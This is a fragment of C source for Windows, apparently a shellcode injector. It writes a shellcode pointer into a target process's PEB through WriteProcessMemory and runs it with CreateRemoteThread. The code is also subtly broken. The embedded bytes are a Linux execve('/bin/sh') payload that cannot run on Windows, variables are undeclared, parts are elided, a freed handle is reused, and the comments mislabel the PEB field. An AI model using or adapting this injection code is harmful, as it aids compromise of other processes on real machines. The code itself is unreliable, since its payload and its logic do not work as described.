## include <windows.h> 
## include <stdio.h> 
## include <tlhelp32.h> 
## include <winternl.h> // For PEB 
 
## pragma comment(lib, "ntdll.lib") 
## pragma comment(lib, "kernel32.lib") 
 
const char* shellcode =  
"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e" 
"\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"; 
 
BOOL InjectShellCode(DWORD pid, const char* moduleName, const char* functionSymbol) { 
    // ... (previous code) 
     
    // Modify the atom table of the ntdll.dll module in the target process 
    PEB peb = { 0 }; 
    if (!ReadProcessMemory(hProcess, pPebAddress, &peb, sizeof(peb), NULL)) { 
        printf("Failed to read the PEB of the target process (error: %d)\n", GetLastError()); 
        CloseHandle(hProcess); 
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE); 
        return FALSE; 
    } 
 
    // Replace the atom table of the target process 
    peb.GdiSharedHandleTable = (ULONG_PTR)pRemoteShellcode; 
 
    if (!WriteProcessMemory(hProcess, pPebAddress, &peb, sizeof(peb), NULL)) { 
        printf("Failed to modify the PEB of the target process (error: %d)\n", GetLastError()); 
        CloseHandle(hProcess); 
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE); 
        return FALSE; 
    } 
 
    // Create a thread in the target process to execute the shellcode 
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunction, NULL, 0, NULL); 
    if (hThread == NULL) { 
        printf("Failed to create remote thread in the target process (error: %d)\n", GetLastError()); 
        CloseHandle(hProcess); 
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE); 
        return FALSE; 
    } 
 
    // Wait for the thread to finish 
    WaitForSingleObject(hThread, INFINITE); 
 
    // Clean up 
    CloseHandle(hThread); 
    CloseHandle(hProcess); 
    VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE); 
 
    return TRUE; 
} 
 
int main() { 
    DWORD targetPID = ...; // The target process PID 
    const char* moduleName = "..."; // Module name 
    const char* functionSymbol = "..."; // Function symbol 
 
    // ... (previous code) 
 
    BOOL success = InjectShellCode(targetPID, moduleName, functionSymbol); 
    if (success) { 
        printf("Shellcode injection successful!\n"); 
    } else { 
        printf("Shellcode injection failed!\n"); 
    } 
 
    return 0; 
}
